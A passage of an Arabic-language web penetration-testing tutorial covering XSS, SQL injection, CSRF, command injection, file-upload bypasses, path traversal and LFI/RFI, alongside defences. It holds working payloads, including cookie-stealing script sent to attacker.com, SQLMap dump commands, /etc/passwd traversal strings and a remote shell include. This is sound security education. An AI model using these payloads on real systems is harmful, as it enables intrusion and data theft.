        </tbody>
      </table>
    </div>
    <h3>الزحف والتجسس باستخدام OWASP ZAP</h3>
    <p>في Spider Tab، تبدأ الزحف على الموقع وتجمع كل الروابط والصفحات الموجودة، وبعد كده تبدأ Active Scan عشان تدور على ثغرات في الصفحات اللي جمعتها.</p>
    <h3>إعداد الهدف في OWASP ZAP (Target Context)</h3>
    <p>في ZAP تقدر تعمل Context للموقع اللي بتفحصه — إعدادات مخصصة لتحديد صفحات معينة أو مسارات حساسة.</p>
    <h3>استكشاف الأدلة (Directory Enumeration) باستخدام ZAP و Burp</h3>
    <p>
      هو إنك تدور على مجلدات أو ملفات مخفية في الموقع. أدوات زي Intruder في Burp أو Forced Browse في ZAP بتجرب
      أسماء مشهورة زي <code>/admin</code> أو <code>/backup</code> عشان تشوف لو فيه ملفات مخفية ممكن تدخل عليها.
    </p>
    <h3>مهاجمة النماذج باستخدام ZAP و Burp</h3>
    <ul>
      <li>في Burp، باستخدام Intruder تبعت طلبات كتير لنموذج زي صفحة تسجيل دخول، وتجرب كلمات مرور مختلفة</li>
      <li>في ZAP، تستخدم Fuzzer أو Active Scan للهجوم على النماذج وتجربة مدخلات مختلفة لاكتشاف الثغرات</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 4. XSS ============ -->
  <section class="stage" id="xss">
    <h2><span class="num">4</span> Cross-Site Scripting (XSS)</h2>
    <p>السكشن ده بيغطي: أنواع هجمات XSS، تشريح الهجوم، Reflected وStored وDOM-Based XSS بالتفصيل، والاكتشاف الآلي.</p>
    <h3>مقدمة</h3>
    <p>
      ثغرة XSS هي واحدة من أشهر الثغرات في تطبيقات الويب، بتسمح للمهاجم إنه يحقن أكواد ضارة (زي JavaScript) في صفحات
      الويب اللي بيشوفها المستخدمين. الهدف الرئيسي إن المهاجم يتحكم في متصفح الضحية ويستخدم صلاحياته — زي الوصول
      للكوكيز، الجلسات، أو تنفيذ أكواد على المتصفح.
    </p>
    <h3>إيه اللي المهاجم يقدر يعمله فعليًا بعد نجاح XSS؟</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>التأثير</th><th>الشرح</th></tr></thead>
        <tbody>
          <tr><td>سرقة الجلسة (Session Hijacking)</td><td>سرقة الكوكيز واستخدامها للدخول كضحية</td></tr>
          <tr><td>Keylogging</td><td>تسجيل كل ضغطة كيبورد للضحية على الصفحة</td></tr>
          <tr><td>Defacement</td><td>تغيير شكل الصفحة اللي شايفها الضحية</td></tr>
          <tr><td>Phishing داخل الصفحة نفسها</td><td>عرض نموذج تسجيل دخول وهمي فوق الصفحة الحقيقية</td></tr>
          <tr><td>تنفيذ أوامر بالنيابة عن الضحية</td><td>زي تغيير إيميله أو باسورده من غير ما يحس</td></tr>
        </tbody>
      </table>
    </div>
    <h3>أنواع هجمات XSS</h3>
    <h4>1. Reflected XSS</h4>
    <p>بيحصل لما الموقع يعكس (reflect) البيانات اللي دخلها المستخدم في الرد على نفس الطلب، وده بيكون غالبًا في الـ URL.</p>
    <h4>2. Stored XSS</h4>
    <p>
      بيحصل لما المهاجم يحقن الأكواد الضارة في قاعدة بيانات الموقع أو مكان تخزين دائم، والأكواد دي بتتنفذ لما
      مستخدمين تانيين يفتحوا الصفحة — وده أخطر من الـ Reflected لأنه بيأثر على كل زوار الصفحة، مش المهاجم بس.
    </p>
    <h4>3. DOM-Based XSS</h4>
    <p>
      الأكواد الضارة بتتنفذ على مستوى المتصفح بسبب تعديل الـ DOM (Document Object Model) من غير ما يمر الطلب على
      الخادم أصلًا — يعني المشكلة كلها في الجافاسكريبت اللي شغال على المتصفح، مش في السيرفر.
    </p>
    <h3>تشريح هجوم XSS</h3>
    <ul>
      <li><strong>الخطوة الأولى:</strong> المهاجم بيدور على مدخل (input) زي نموذج تسجيل أو حقل بحث يقبل بيانات من المستخدم</li>
      <li><strong>الخطوة الثانية:</strong> المهاجم بيدخل كود JavaScript ضار في المدخل ده</li>
      <li><strong>الخطوة الثالثة:</strong> الموقع بيرجع الكود الضار للمستخدمين التانيين (Stored XSS) أو للمهاجم نفسه (Reflected XSS) من غير فحص أو ترشيح</li>
      <li><strong>الخطوة الرابعة:</strong> الأكواد بتتنفذ في متصفح الضحية، ويحصل اللي المهاجم كان مخططه — سرقة بيانات أو تنفيذ أوامر على المتصفح</li>
    </ul>
    <h3>Reflected XSS بالتفصيل</h3>
    <p>
      بيحصل لما المهاجم يحقن كود ضار في المدخلات اللي بتتعكس في الرد على الطلب مباشرة، زي حقول البحث أو الروابط
      اللي فيها معلمات (parameters) زي <code>?search=query</code>.
    </p>
    <p><strong>التعرف على واستغلال Reflected XSS:</strong></p>
    <ul>
      <li>تدور على مدخلات في الموقع زي نماذج أو معلمات URL بتقبل أي نوع من البيانات</li>
      <li>تحاول تحقن كود JavaScript في المدخل ده وتشوف لو الموقع هيعكس الكود ده في الرد</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        <code>http://example.com/search?query=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</code>
      </p>
      <p class="dim">
        (الرابط ده مكتوب بترميز URL Encoding عمدًا عشان ميتنفذش لو اتنسخ لمتصفح بالغلط — في الاختبار الفعلي بتحقن
        الكود الخام زي: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>)
      </p>
      <p>
        لو ظهر Alert فيه قيمة الكوكيز، يبقى فيه ثغرة Reflected XSS فعلية، وده معناه إن المهاجم يقدر يسرق جلسة
        المستخدم لو خدعه يدوس على رابط مشابه.
      </p>
    </div>
    <h3>Stored XSS بالتفصيل</h3>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>لو فيه صفحة تعليقات في مدونة، وحطيت في خانة التعليق:</p>
      <pre><code>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code></pre>
      <p class="dim">(الكود هنا لتوضيح الفكرة فقط، وفي الاختبار الفعلي بتحقنه زي ما هو).</p>
      <p>ولو الموقع خزّن التعليق ده وعرضه لكل الزوار من غير تنقية، كل زائر يفتح الصفحة كوكيز جلسته هتتبعت تلقائيًا للمهاجم.</p>
    </div>
    <h3>DOM-Based XSS بالتفصيل</h3>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>لو الموقع بياخد قيمة من الـ URL Fragment (اللي بعد #) ويحطها مباشرة في الصفحة بجافاسكريبت زي:</p>
      <pre><code>document.getElementById("welcome").innerHTML = location.hash.substring(1);</code></pre>
      <p>فتقدر تحقن:</p>
      <pre><code>http://example.com/page.html#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code></pre>
      <p class="dim">(الشكل الخام اللي بتحقنه فعليًا هو: <code>&lt;img src=x onerror=alert(1)&gt;</code>)</p>
      <p>
        المشكلة هنا إن السيرفر أصلًا مش شايف حاجة، الترميز اللي بعد # مبيتبعتش للسيرفر، فالفحص لازم يركز على الكود
        اللي شغال في المتصفح مش على الردود بتاعة السيرفر.
      </p>
    </div>
    <h3>الاكتشاف الآلي لثغرات XSS</h3>
    <p>XSStrike أداة متخصصة في اكتشاف واستغلال ثغرات XSS بشكل آلي:</p>
    <pre><code>python3 xsstrike.py -u "http://example.com/search?query=test"</code></pre>
    <p class="dim">كمان Burp Suite Scanner وOWASP ZAP Active Scan بيقدروا يكتشفوا XSS بشكل آلي أثناء فحصهم الشامل للموقع.</p>
    <h3>طرق الحماية من XSS (مهم تعرفها كمان لو بتكتب تقرير)</h3>
    <ul>
      <li><strong>Output Encoding:</strong> ترميز أي بيانات جاية من المستخدم قبل عرضها في الصفحة</li>
      <li><strong>Content Security Policy (CSP):</strong> رأس HTTP بيحدد مصادر التحميل المسموحة للسكريبتات، وبيمنع تنفيذ Inline Scripts افتراضيًا</li>
      <li><strong>HttpOnly Cookies:</strong> يمنع الجافاسكريبت من الوصول للكوكيز حتى لو حصل XSS فعلي</li>
      <li><strong>مكتبات تنقية موثوقة:</strong> زي DOMPurify بدل محاولة كتابة فلتر تنقية يدوي بنفسك</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 5. SQLI ============ -->
  <section class="stage" id="sqli">
    <h2><span class="num">5</span> SQL Injection</h2>
    <p>السكشن ده بيغطي: أنواع SQLi، أساسيات قواعد البيانات، In-Band وBlind SQLi، الاكتشاف الآلي بـ SQLMap، وNoSQL Injection.</p>
    <h3>مقدمة</h3>
    <p>
      ثغرة SQL Injection من أخطر الثغرات الأمنية في تطبيقات الويب، لأنها بتسمح للمهاجم إنه يتلاعب بقاعدة البيانات
      اللي ورا التطبيق من خلال إدخال أكواد SQL ضارة في المدخلات. الهدف الأساسي هو الوصول لبيانات حساسة أو تنفيذ
      أوامر غير مصرح بها على قاعدة البيانات.
    </p>
    <h3>أنواع ثغرات SQL Injection</h3>
    <ul>
      <li><strong>In-Band SQLi:</strong> المهاجم بيحصل على النتائج مباشرة في نفس القناة اللي أرسل فيها الطلب. أشهر أشكاله Error-Based SQLi وUNION-Based SQLi</li>
      <li><strong>Blind SQLi:</strong> مفيش رد مباشر من قاعدة البيانات، لكن المهاجم بيعتمد على تغيير سلوك التطبيق عشان يستنتج البيانات. أشهر أنواعه Boolean-Based SQLi وTime-Based SQLi</li>
      <li><strong>Out-of-Band SQLi:</strong> المهاجم بيستخدم قنوات خارجية عشان يحصل على الردود، زي إرسال النتائج لعنوان خارجي</li>
    </ul>
    <h3>مقدمة عن قواعد البيانات والـ DBMS</h3>
    <ul>
      <li><strong>قواعد البيانات (Databases):</strong> المكان اللي بيتم فيه تخزين البيانات بشكل منظم لتسهيل استرجاعها</li>
      <li><strong>DBMS:</strong> الأنظمة اللي بتسمح لك بالتفاعل مع قواعد البيانات، زي MySQL وPostgreSQL وOracle</li>
      <li><strong>قواعد بيانات علائقية (Relational):</strong> بتعتمد على جداول مترابطة، زي MySQL وPostgreSQL</li>
      <li><strong>قواعد بيانات غير علائقية (NoSQL):</strong> مبتعتمدش على الجداول، بتخزن البيانات بشكل غير منظم، زي MongoDB وCouchDB</li>
    </ul>
    <h3>أساسيات SQL</h3>
    <p>أوامر SQL الأساسية:</p>
    <ul>
      <li><strong>SELECT:</strong> لاسترجاع البيانات</li>
      <li><strong>INSERT:</strong> لإضافة بيانات جديدة</li>
      <li><strong>UPDATE:</strong> لتعديل البيانات</li>
      <li><strong>DELETE:</strong> لحذف البيانات</li>
    </ul>
    <h3>البحث عن ثغرات SQL Injection</h3>
    <ul>
      <li>تدور على مدخلات في التطبيق زي حقول البحث أو نماذج تسجيل الدخول اللي بتتفاعل مع قاعدة البيانات</li>
      <li>تحاول تحقن كود SQL بسيط زي <code>' OR '1'='1</code> وتشوف لو التطبيق بيستجيب بنتائج غير متوقعة</li>
      <li>تستخدم أدوات زي Burp Suite لإرسال الطلبات وتعديل المدخلات لاكتشاف الثغرات</li>
    </ul>
    <h3>اختلاف صيغة الحقن حسب نوع قاعدة البيانات</h3>
    <p class="dim">نفس فكرة SQL Injection، لكن الصياغة بتختلف شوية حسب نوع الـ DBMS، ومهم تعرف الفرق ده عشان تعرف تتعامل مع أي نظام تقابله:</p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>قاعدة البيانات</th><th>رمز التعليق</th><th>مثال استخراج نسخة قاعدة البيانات</th></tr></thead>
        <tbody>
          <tr><td>MySQL</td><td><code>--</code> أو <code>#</code></td><td><code>UNION SELECT @@version --</code></td></tr>
          <tr><td>Microsoft SQL Server</td><td><code>--</code></td><td><code>UNION SELECT @@version --</code></td></tr>
          <tr><td>PostgreSQL</td><td><code>--</code></td><td><code>UNION SELECT version() --</code></td></tr>
          <tr><td>Oracle</td><td><code>--</code></td><td><code>UNION SELECT banner FROM v$version --</code></td></tr>
        </tbody>
      </table>
    </div>
    <h3>In-Band SQLi (Error-Based &amp; UNION-Based)</h3>
    <p><strong>Error-Based SQLi:</strong> المهاجم بيستغل أخطاء قاعدة البيانات اللي بتظهر في الردود عشان يستخرج معلومات.</p>
    <p><strong>UNION-Based SQLi</strong> — مثال:</p>
    <pre><code>' UNION SELECT username, password FROM users --</code></pre>
    <p>قبل ما تستخدم UNION، لازم تعرف عدد الأعمدة في الاستعلام الأصلي، وده بتعرفه بتجربة:</p>
    <pre><code>' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--</code></pre>
    <p class="dim">لحد ما ترجعلك رسالة خطأ — الرقم اللي قبله يبقى هو عدد الأعمدة الصحيح.</p>
    <h3>Blind SQLi (Boolean-Based &amp; Time-Based)</h3>
    <p><strong>Boolean-Based SQLi:</strong> بتعتمد على تغيير سلوك التطبيق بناءً على استعلام صحيح أو خطأ:</p>
    <pre><code>' AND 1=1 --</code></pre>
    <p>لو التطبيق اشتغل زي ما هو، جرب:</p>
    <pre><code>' AND 1=2 --</code></pre>
    <p class="dim">لو حصل تغيير في السلوك (اختفاء بيانات كانت ظاهرة قبل كده مثلًا)، يبقى فيه ثغرة.</p>
    <p><strong>Time-Based SQLi:</strong> بتستخدم أوامر تأخير الوقت عشان تستنتج البيانات بناءً على وقت الاستجابة:</p>
    <pre><code>' OR IF(1=1, SLEEP(5), 0) --</code></pre>
    <p class="dim">لو الصفحة أخدت 5 ثواني إضافية عشان ترد، يبقى الشرط بيتنفذ فعليًا جوا قاعدة البيانات.</p>
    <h3>الاكتشاف والاستغلال الآلي بـ SQLMap</h3>
    <pre><code>sqlmap -u "http://site.com/page?id=1"</code></pre>
    <div class="callout example">
      <span class="label">مثال عملي متكامل</span>
      <pre><code>sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D webapp_db --tables
sqlmap -u "http://site.com/page?id=1" -D webapp_db -T users --dump</code></pre>
      <p>الأوامر دي بترجع قواعد البيانات، بعدها الجداول، وفي الآخر البيانات نفسها.</p>
    </div>
    <p><strong>أهم فلاجز SQLMap اللي هتحتاجها كتير:</strong></p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الفلاج</th><th>الوظيفة</th></tr></thead>
        <tbody>
          <tr><td><code>--dbs</code></td><td>عرض كل قواعد البيانات</td></tr>
          <tr><td><code>-D &lt;name&gt; --tables</code></td><td>عرض جداول قاعدة بيانات معينة</td></tr>
          <tr><td><code>-T &lt;name&gt; --columns</code></td><td>عرض أعمدة جدول معين</td></tr>
          <tr><td><code>--dump</code></td><td>استخراج البيانات فعليًا</td></tr>
          <tr><td><code>--os-shell</code></td><td>محاولة الحصول على Shell على السيرفر لو الصلاحيات سمحت</td></tr>
          <tr><td><code>--risk 3 --level 5</code></td><td>زيادة عمق الفحص وأنواع الحقن المجربة (أبطأ لكن أشمل)</td></tr>
        </tbody>
      </table>
    </div>
    <h3>اختبار اختراق قواعد بيانات NoSQL</h3>
    <p>
      قواعد بيانات NoSQL مختلفة في البنية وطريقة استغلال الثغرات مقارنة بالعلائقية — الهجمات فيها بتعتمد على أكواد
      زي JavaScript بدل SQL. لو قاعدة البيانات بتستخدم MongoDB، ممكن تحقن:
    </p>
    <pre><code>{"$ne": null}</code></pre>
    <p class="dim">
      كمثال، لو حقل الباسورد في طلب تسجيل الدخول بيقبل JSON، إدخال <code>{"$ne": null}</code> بدل الباسورد الحقيقي
      ممكن يخلي الاستعلام يرجع "صح" لأي مستخدم موجود، لأن المقارنة بقت "الباسورد لا يساوي null" بدل مطابقة القيمة
      الفعلية.
    </p>
    <h3>طرق الحماية من SQL Injection</h3>
    <ul>
      <li><strong>Prepared Statements / Parameterized Queries:</strong> أهم وأقوى حماية على الإطلاق</li>
      <li><strong>ORM Frameworks:</strong> زي Hibernate أو Sequelize بتقلل الحقن المباشر بطبيعتها</li>
      <li><strong>Least Privilege:</strong> حساب قاعدة البيانات المستخدم في التطبيق ميكونش عنده صلاحيات إدارية غير محتاجها</li>
      <li><strong>WAF:</strong> كطبقة حماية إضافية، مش بديل عن الحماية الصحيحة في الكود</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 6. COMMON ATTACKS ============ -->
  <section class="stage" id="common-attacks">
    <h2><span class="num">6</span> الهجمات الشائعة (Common Attacks)</h2>
    <p>السكشن ده بيغطي: اختبار طرق HTTP والمصادقة، تعريض البيانات الحساسة، المصادقة المكسورة، أمان الجلسات، هجمات الحقن، التكوينات الخاطئة، والمكونات القديمة.</p>
    <h3>اختبار طرق HTTP والمصادقة</h3>
    <p>
      <strong>طرق HTTP:</strong> بتعمل اختبار على الطرق المختلفة زي GET, POST, PUT, DELETE، عشان تشوف لو فيه ثغرات.
      ساعات السيرفرات بتكون مش متأمنة كويس وبتسمح بطرق زي DELETE لناس مش مفروض يكون عندهم صلاحيات.
    </p>
    <pre><code>curl -X OPTIONS http://example.com -i</code></pre>
    <p class="dim">الأمر ده بيوريك كل الطرق المسموحة على الرابط، وده أول خطوة منطقية قبل ما تجرب أي طريقة يدويًا.</p>
    <p>
      <strong>اختبار المصادقة:</strong> بتشوف إزاي الموقع بيعمل تسجيل دخول للمستخدمين، لو فيه تشفير قوي، ولو بيدير
      الأخطاء بطريقة صح. بتدور على تخمين الباسوردات، كلمات مرور ضعيفة، أو غياب المصادقة متعددة العوامل (MFA).
    </p>
    <h3>تعريض البيانات الحساسة (Sensitive Data Exposure)</h3>
    <p>بتحصل لما الموقع يكشف بيانات حساسة زي معلومات شخصية، أرقام كروت ائتمان، أو بيانات صحية.</p>
    <p>
      <strong>الاختبار:</strong> تتأكد إن البيانات متشفرة سواء وهي بتتنقل أو محفوظة، وتستخدم Burp Suite للتأكد إن
      البيانات الحساسة مش بتتبعت عبر HTTP العادي، وإن فيه رؤوس أمان زي <code>Strict-Transport-Security</code>.
    </p>
    <p><strong>أهم رؤوس الأمان اللي لازم تتأكد من وجودها:</strong></p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الرأس</th><th>الوظيفة</th></tr></thead>
        <tbody>
          <tr><td><code>Strict-Transport-Security</code></td><td>يجبر المتصفح يستخدم HTTPS بس</td></tr>
          <tr><td><code>Content-Security-Policy</code></td><td>يحدد مصادر تحميل المحتوى المسموحة</td></tr>
          <tr><td><code>X-Frame-Options</code></td><td>يمنع تحميل الصفحة جوا iframe (حماية من Clickjacking)</td></tr>
          <tr><td><code>X-Content-Type-Options: nosniff</code></td><td>يمنع المتصفح من تخمين نوع المحتوى بشكل خاطئ</td></tr>
          <tr><td><code>Set-Cookie: HttpOnly; Secure</code></td><td>يحمي الكوكيز من الوصول عبر جافاسكريبت ومن الإرسال بدون تشفير</td></tr>
        </tbody>
      </table>
    </div>
    <p class="dim">أمثلة: بيانات حساسة ظاهرة في عناوين URLs، في رسائل الخطأ، أو في الكوكيز.</p>
    <h3>هجمات المصادقة المكسورة (Broken Authentication)</h3>
    <ul>
      <li><strong>مهاجمة نماذج تسجيل الدخول:</strong> تخمين كلمات المرور، استخدام بيانات مسربة، أو استغلال كلمات مرور ضعيفة. لو الموقع مش عامل تحديد للمحاولات أو مش مركب CAPTCHA، بيبقى سهل تهجمه</li>
      <li><strong>تجاوز المصادقة:</strong> سرقة الجلسات (Session Hijacking)، تعديل طلبات HTTP، أو استغلال أخطاء في التحكم بالوصول (زي تعديل الروابط عشان توصل لأماكن مش مفروض تكون ليك)</li>
    </ul>
    <h3>اختبار أمان الجلسات</h3>
    <ul>
      <li><strong>سرقة الجلسات (Session Hijacking):</strong> المهاجم بيستغل الكوكيز اللي بتحدد جلستك وياخدها عشان يتحكم في حسابك. بتستخدم Burp Suite لتشوف لو الكوكيز محمية بخصائص زي HttpOnly وSecure</li>
      <li><strong>ثبات الجلسة (Session Fixation):</strong> المهاجم بيحدد معرف الجلسة قبل ما تسجل دخولك، ولما تدخل بحسابك هو كده بقى عنده نفس المعرف</li>
      <li><strong>CSRF:</strong> بيحصل لما يخدعك المهاجم عشان تعمل حاجة على موقع أنت مسجل فيه من غير ما تعرف، عشان كده المواقع لازم تستخدم رموز حماية خاصة (CSRF Tokens)</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي لصفحة CSRF هجومية بسيطة</span>
      <pre><code>&lt;img src="http://example.com/change-password?newpass=hacked123" style="display:none"&gt;</code></pre>
      <p>
        لو ضحية مسجل دخول على <code>example.com</code> فتح صفحة فيها الكود ده، هيتغير الباسورد بتاعه من غير ما يعمل
        أي إجراء واعي — والحماية الوحيدة الفعالة هنا وجود CSRF Token بيتغير مع كل طلب.
      </p>
    </div>
    <h3>هجمات الحقن والتحقق من المدخلات</h3>
    <ul>
      <li><strong>حقن الأوامر (Command Injection):</strong> استغلال ثغرات في معالجة مدخلات المستخدم لتشغيل أوامر على النظام</li>
      <li><strong>حقن الأكواد (Code Injection):</strong> إدخال بيانات ضارة جوا كود الموقع نفسه، وده بيخلي المهاجم يقدر يشغل أكواد على السيرفر</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال Command Injection</span>
      <pre><code>http://example.com/ping?host=8.8.8.8; whoami</code></pre>
      <p>لو الفاصلة المنقوطة اتنفذت فعليًا وطلع اسم المستخدم بتاع السيرفر، فيه ثغرة Command Injection مؤكدة.</p>
    </div>
    <p class="dim">
      الاختبار: استخدام Burp Suite's Intruder لحقن بيانات ومراقبة استجابة السيرفر، والتأكد إن التطبيق بيعمل تعقيم
      للمدخلات (Sanitization).
    </p>
    <h3>اختبار تكوينات الأمان الخاطئة</h3>
    <p>ساعات التطبيقات أو السيرفرات بيكون فيها تكوينات غلط زي إعدادات افتراضية، برامج قديمة، أو خدمات شغالة من غير داعي.</p>
    <p><strong>قائمة سريعة للمراجعة:</strong></p>
    <ul>
      <li>هل صفحات الخطأ بتكشف تفاصيل تقنية زيادة عن اللزوم (Stack Traces)؟</li>
      <li>هل لوحة الإدارة (Admin Panel) متاحة من غير قيود وصول؟</li>
      <li>هل فيه ملفات نسخ احتياطي منسية زي <code>.bak</code> أو <code>.old</code> متاحة للتحميل المباشر؟</li>
      <li>هل الـ Directory Listing مفعّل ويوري محتوى المجلدات؟</li>
    </ul>
    <p class="dim">الاختبار: فحص المنافذ المفتوحة والخدمات الغير محتاجة ونسخ البرامج القديمة، باستخدام Nmap وNikto.</p>
    <p class="dim">أفضل الممارسات: التأكد من الإعدادات الأمنية صح، وقفل كل الخدمة الغير محتاجة، واستخدام إعدادات أمان قوية.</p>
    <h3>استغلال المكونات الضعيفة وغير المحدثة</h3>
    <p>لو التطبيق بيستخدم مكتبات أو برامج قديمة، ده بيخليه عرضة للهجمات المعروفة.</p>
    <ul>
      <li><strong>الاختبار:</strong> استخدام أدوات زي OWASP Dependency-Check للتأكد لو فيه مكونات قديمة ومعروفة إنها فيها ثغرات (CVEs)</li>
      <li><strong>الاستغلال:</strong> الدوران على ثغرات معروفة في قواعد بيانات الـ CVEs وعمل حمولات (Payloads) تستغلها للهجوم</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 7. FILE ATTACKS ============ -->
  <section class="stage" id="file-attacks">
    <h2><span class="num">7</span> هجمات الملفات والموارد (File &amp; Resource Attacks)</h2>
    <p>السكشن ده بيغطي: رفع الملفات العشوائية، تجاوز فلاتر الامتداد والقوائم السوداء، Directory/Path Traversal، وLFI &amp; RFI.</p>
    <h3>مقدمة في ثغرات رفع الملفات العشوائية</h3>
    <p>
      الموقع يسمحلك ترفع ملفات، لكن مش بيفحصها كويس — ده ممكن يخلي المهاجم يرفع ملفات خبيثة زي سكربتات PHP، اللي
      ممكن تنفذ أوامر على السيرفر.
    </p>
    <p class="dim">مثال: لو عندك نموذج رفع ملفات مش مطبق فيه حماية قوية، ممكن حد يرفع ملف اسمه <code>shell.php</code> ويستخدمه عشان يتحكم في السيرفر.</p>
    <h3>تجاوز فلاتر امتداد الملفات</h3>
    <p>المواقع غالبًا بتحط قيود على أنواع الملفات المسموح بها، زي صور فقط. إزاي تتجاوزها؟</p>
    <ul>
      <li>رفع ملف باسم غير عادي، مثلًا <code>shell.php.jpg</code>، فيبقى شكله كأنه صورة</li>
      <li>استخدام "double extension" زي <code>shell.php.gif</code> عشان تخدع السيرفر</li>
      <li>تعديل رأس <code>Content-Type</code> في الطلب نفسه (زي إرسال ملف PHP لكن بـ <code>Content-Type: image/jpeg</code>) لو الفحص بيعتمد على الرأس بس مش على محتوى الملف</li>
      <li>إضافة Null Byte قديمًا (زي <code>shell.php%00.jpg</code>) — تقنية قديمة اتصلحت في النسخ الحديثة من PHP لكن ممكن تلاقيها لسه في أنظمة قديمة جدًا</li>
    </ul>
    <h3>تجاوز القوائم السوداء (PHPx Blacklists)</h3>
    <p>القوائم السوداء بتبقى قائمة بأنواع الملفات الممنوعة، زي ملفات PHP.</p>
    <p class="dim">تجاوزها: رفع ملف بامتداد مختلف زي <code>.php5</code> أو <code>.phtml</code> أو <code>.pht</code>، أو استخدام حيل لإخفاء الكود جوا الملف.</p>
    <h3>Directory/Path Traversal</h3>
    <p>
      بتحصل لما الموقع يسمح للمهاجم إنه يوصل لملفات النظام المهمة عن طريق إدخال مسارات غير صحيحة، عادةً بإدخال رموز
      زي <code>../</code> عشان ينتقل لأعلى المجلدات.
    </p>
    <p><strong>التحديد والاستغلال:</strong></p>
    <pre><code>http://example.com/download?file=../../etc/passwd</code></pre>
    <p class="dim">لو نجحت، تقدر تقرأ ملفات مهمة أو حتى تنفذ أوامر ضارة على السيرفر.</p>
    <p><strong>ترميزات بديلة</strong> لو الفلتر البسيط رفض <code>../</code> بالظبط:</p>
    <pre><code>..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd</code></pre>
    <h3>LFI و RFI</h3>
    <ul>
      <li><strong>LFI (Local File Inclusion):</strong> تقدر تحمل ملف موجود على السيرفر نفسه</li>
      <li><strong>RFI (Remote File Inclusion):</strong> تقدر تحمل ملف من الإنترنت — RFI أخطر لأنه بيسمح بتنفيذ كود خبيث من برة السيرفر بالكامل</li>
    </ul>
    <p><strong>التحديد والاستغلال:</strong></p>
    <pre><code># LFI
index.php?page=../../etc/passwd
# RFI
index.php?page=http://attacker.com/shell.txt</code></pre>
    <ul>
      <li><strong>LFI:</strong> تقدر تقرأ ملفات مهمة زي <code>/etc/passwd</code></li>
      <li><strong>RFI:</strong> تقدر تستخدمها عشان ترفع سكربت ضار وتنفذه عن بعد</li>
    </ul>
    <p><strong>PHP Wrappers مفيدة جدًا مع LFI:</strong></p>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الـ Wrapper</th><th>الاستخدام</th></tr></thead>
        <tbody>
          <tr><td><code>php://filter/convert.base64-encode/resource=index.php</code></td><td>قراءة كود PHP كـ Base64 بدل ما يتنفذ مباشرة</td></tr>
          <tr><td><code>data://text/plain;base64,&lt;كود مشفر&gt;</code></td><td>تنفيذ كود PHP مباشر لو الإعدادات سمحت (<code>allow_url_include</code>)</td></tr>
          <tr><td><code>php://input</code></td><td>تمرير كود من جسم الطلب (Body) نفسه لتنفيذه</td></tr>
        </tbody>
      </table>
    </div>
    <div class="callout example">
      <span class="label">مثال عملي متكامل</span>
      <p>
        لقيت باراميتر <code>page</code> في رابط زي <code>http://example.com/index.php?page=about.php</code> بيحمّل
        صفحات من السيرفر. جربت <code>?page=../../../../etc/passwd</code> ولقيت محتوى الملف ظاهر في الصفحة — دي ثغرة
        LFI مؤكدة. عشان أقرأ كود PHP نفسه بدل ما يتنفذ، استخدمت:
      </p>
      <pre><code>?page=php://filter/convert.base64-encode/resource=config.php</code></pre>
      <p>وفكيت الناتج بـ Base64 عشان أشوف كود التطبيق نفسه، ولقيت فيه بيانات اتصال قاعدة البيانات مكتوبة صريحة.</p>
    </div>
  </section>
  <hr class="section-divider">
  <!-- ============ 8. WEB SERVICES ============ -->
  <section class="stage" id="web-services">
    <h2><span class="num">8</span> خدمات الويب (Web Services)</h2>
    <p>السكشن ده بيغطي: أنواع تنفيذ خدمات الويب، أساسيات WSDL، واختبار أمان خدمات SOAP.</p>
    <h3>مقدمة في خدمات الويب</h3>
    <p>خدمات الويب هي تطبيقات تفاعلية بتتيح نقل البيانات والتفاعل بين أنظمة مختلفة عبر الإنترنت، وبتستخدم بروتوكولات محددة زي HTTP وSOAP وREST.</p>
    <p><strong>أنواع خدمات الويب:</strong></p>
    <ul>
      <li><strong>SOAP:</strong> بتعتمد على XML لتبادل الرسائل وتستخدم بروتوكولات زي HTTP وSMTP</li>
      <li><strong>REST:</strong> بتعتمد على أساليب HTTP (GET, POST, PUT, DELETE) وتستخدم JSON أو XML لتبادل البيانات</li>
    </ul>
    <p class="dim">استخداماتها: تطبيقات زي الخدمات المصرفية عبر الإنترنت، منصات التجارة الإلكترونية، وتكامل الأنظمة.</p>
    <h3>تنفيذ خدمات الويب</h3>
    <ul>
      <li><strong>مبنية على SOAP:</strong> بيتم إنشاء الخدمة باستخدام XML وتُعرَّف في ملف WSDL</li>
      <li><strong>مبنية على REST:</strong> بتعتمد على بناء API باستخدام HTTP، وغالبًا بتكون بسيطة وسهلة الاستخدام</li>
    </ul>
    <p class="dim">أمثلة: استخدام خدمات زي Amazon Web Services (AWS) أو Google APIs لدمج وظائف محددة في التطبيقات.</p>
    <h3>أساسيات لغة WSDL</h3>
    <p>WSDL هي لغة وصف خدمات الويب، بتحدد إزاي العملاء بيتفاعلوا مع الخدمة.</p>
    <p><strong>مكونات WSDL:</strong></p>
    <ul>
      <li><strong>Types:</strong> تعريف أنواع البيانات المستخدمة في الرسائل</li>
      <li><strong>Messages:</strong> تعريف البيانات المتبادلة بين العميل والخدمة</li>
      <li><strong>Port Type:</strong> تحديد العمليات المتاحة في الخدمة</li>
      <li><strong>Binding:</strong> تحديد بروتوكولات الاتصال والتنسيقات</li>
      <li><strong>Service:</strong> تحديد عنوان الخدمة ومكان الوصول إليها</li>
    </ul>
    <p class="dim">مثال مبسط لجزء من ملف WSDL:</p>
    <pre><code>&lt;message name="GetUserRequest"&gt;
  &lt;part name="userId" type="xsd:int"/&gt;
